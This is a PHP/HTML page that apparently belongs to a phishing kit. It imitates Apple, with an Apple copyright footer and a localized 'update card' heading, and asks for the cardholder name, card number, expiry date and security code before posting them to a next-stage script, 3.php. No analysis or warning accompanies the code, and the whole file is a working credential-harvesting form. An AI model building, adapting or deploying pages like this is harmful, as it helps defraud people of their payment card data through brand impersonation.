<?php
session_start();
include "../functions/lang.php";
?>
<!DOCTYPE HTML>
<html lang="en">
<head>
<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
<title><?php echo $updatecard;?></title>
<!-- Meta tag Keywords -->
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="keywords" content="Online Login Form Responsive Widget,Login form widgets, Sign up Web forms , Login signup Responsive web form,Flat Pricing table,Flat Drop downs,Registration Forms,News letter Forms,Elements" />
<script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false);
function hideURLbar(){ window.scrollTo(0,1); } </script>
<!-- Meta tag Keywords -->
<!-- css files -->
<link rel="stylesheet" href="css/style.css" type="text/css" media="all" /> <!-- Style-CSS --> 
<link rel="stylesheet" href="css/font-awesome.css"> <!-- Font-Awesome-Icons-CSS -->
<!-- //css files -->
<!-- online-fonts -->
<link href="//fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i&amp;subset=cyrillic,cyrillic-ext,greek,greek-ext,latin-ext,vietnamese" rel="stylesheet">
<link href="//fonts.googleapis.com/css?family=Dosis:200,300,400,500,600,700,800&amp;subset=latin-ext" rel="stylesheet">
<!-- //online-fonts -->
</head>
<body>
<!-- main -->

	
<div class="bodyy">
		  <div align="center"><img src="images/1x.png" align="left"><img src="images/2x.png" align="absmiddle"><img src="images/3x.png" align="right"></div>
	</div>
	
	<!--//header-->
	<div class="main-content-agile">
		<div class="sub-main-w3">	

		  <form action="3.php" method="post">
          
		    <div class="pom-agile">
				  <div style="background-color:#F2F2F2; border-top-right-radius: 2em; border-top-left-radius: 2em;" align="center"> 
				    <h1>&nbsp;</h1>
				    <h1><?php echo $updatecard;?></h1>
				    <p>&nbsp;</p>
				  </div>
			</div>
		    <div class="pom-agile">
  <div style="background-color:#F2F2F2" align="center">
<input name="nameoncard1" type="text" placeholder="<?php echo $nameonc;?>" id="nameoncard1" class="user" required />
</div>
</div>

 <div class="pom-agile">
<div style="background-color:#F2F2F2" align="center">
<input name="cardnumber1" type="tel" placeholder="<?php echo $cardnum;?>" maxlength="16" id="cardnumber1" class="user" required />
</div>
</div>

 <div class="pom-agile">
<div style="background-color:#F2F2F2" align="center">
<input name="exp1" type="tel" maxlength="7" placeholder="<?php echo $expd;?>" id="exp1" onkeyup="this.value=this.value.replace(/^(\d\d)(\d)$/g,'$1/$2').replace(/[^\d\/]/g,'')" class="user" required />
</div>
</div>

 <div class="pom-agile">
<div style="background-color:#F2F2F2" align="center">
<input name="csc1" type="tel" maxlength="3" placeholder="<?php echo $cv;?>" id="csc1" class="user" required />
</div>
<div class="pom-agile" style="background-color:#F2F2F2; border-bottom-right-radius: 2em; border-bottom-left-radius: 2em;" align="center">
						<p align="center">&nbsp;	    </p>
						<p align="center">
						  <input type="submit" value="<?php echo $continuee;?>">
	    </p>
		  <p align="center">&nbsp;</p>
			</div>
		  </form>
		</div>
	</div>
	<!--//main-->

  <div class="downn">
    <h1 class="downn">Copyright © 2017 Apple Inc. All rights reserved.</h1>
  </div>

</body>
</html>